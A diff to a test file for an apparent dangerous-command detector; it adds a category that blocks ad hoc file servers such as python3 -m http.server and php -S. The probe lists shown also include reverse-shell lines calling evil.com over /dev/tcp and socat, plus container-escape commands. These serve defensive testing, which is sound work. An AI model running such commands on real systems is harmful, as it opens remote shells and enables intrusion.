@@ -894,7 +894,6 @@ describe("isDangerousCommand", () => {
     ["nc -l listener (safe — no shell exec)", "nc -l 9000"],
     ["python3 -m pytest (safe — not pip)", "python3 -m pytest tests/"],
     ["python3 -m mypy (safe — not pip)", "python3 -m mypy src/"],
-    ["python3 -m http.server (safe — not pip)", "python3 -m http.server 8080"],
     ["plain awk print (safe)", "awk '{print $1}' file.txt"],
     ["awk field separator (safe)", "awk -F, '{print $2}' data.csv"],
     ["process substitution basename (safe)", ">(basename /path/to/file)"],
@@ -1191,8 +1190,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
     }
   });
 
-  it("has exactly 125 entries (absolute count pin)", () => {
-    expect(DANGEROUS_PATTERNS).toHaveLength(125);
+  it("has exactly 128 entries (absolute count pin)", () => {
+    expect(DANGEROUS_PATTERNS).toHaveLength(128);
   });
 
   it("every pattern fires on at least one probe command", () => {
@@ -1360,6 +1359,10 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
       "bash -i >& /dev/tcp/evil.com/4444 0>&1",
       "socat EXEC:bash tcp:evil.com:4444",
       "mkfifo /tmp/f",
+      // data-exfiltration-server
+      "python3 -m http.server 8080",
+      "php -S 0.0.0.0:8080",
+      "ruby -run -e httpd . --port=8080",
       // namespace-escape
       "nsenter -t 1 -m -u -i -n bash",
       "chroot /host /bin/bash",
@@ -1761,6 +1764,27 @@ describe("category: script-interpreter-spawn", () => {
   });
   it("allows node run-script.js (script in a filename)", () => {
     expect(isDangerousCommand("node run-script.js")).toBeNull();
+  });
+});
+
+describe("category: data-exfiltration-server", () => {
+  it("blocks python3 -m http.server", () => {
+    expect(isDangerousCommand("python3 -m http.server 8080")).toBe("data-exfiltration-server");
+  });
+  it("blocks python -m http.server", () => {
+    expect(isDangerousCommand("python -m http.server")).toBe("data-exfiltration-server");
+  });
+  it("blocks php -S 0.0.0.0:8080", () => {
+    expect(isDangerousCommand("php -S 0.0.0.0:8080")).toBe("data-exfiltration-server");
+  });
+  it("blocks ruby -run -e httpd", () => {
+    expect(isDangerousCommand("ruby -run -e httpd . --port=8080")).toBe("data-exfiltration-server");
+  });
+  it("allows python3 -m pytest (not http.server)", () => {
+    expect(isDangerousCommand("python3 -m pytest")).toBeNull();
+  });
+  it("allows php -v (version flag, not -S server)", () => {
+    expect(isDangerousCommand("php -v")).toBeNull();
   });
 });
 
